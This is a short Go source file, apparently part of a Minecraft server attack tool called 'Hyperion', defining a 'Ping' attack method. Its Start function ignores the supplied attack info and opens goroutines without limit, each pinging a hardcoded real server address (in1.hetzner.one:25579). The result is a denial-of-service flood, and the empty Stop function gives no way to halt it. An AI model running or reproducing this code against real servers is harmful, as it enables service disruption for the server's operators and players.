package methods

import (
	"Hyperion/core/method"

	"github.com/Tnze/go-mc/bot"
)

type Ping struct{}

func (ping Ping) Name() string {
	return "Ping"
}

func (ping Ping) Description() string {
	return "Ping method implementation"
}

func (ping Ping) Start(info method.AttackInfo) {
	for {
		go bot.PingAndList("in1.hetzner.one:25579")
	}
}

func (ping Ping) Stop() {
	// implementation for stopping the Ping method
}
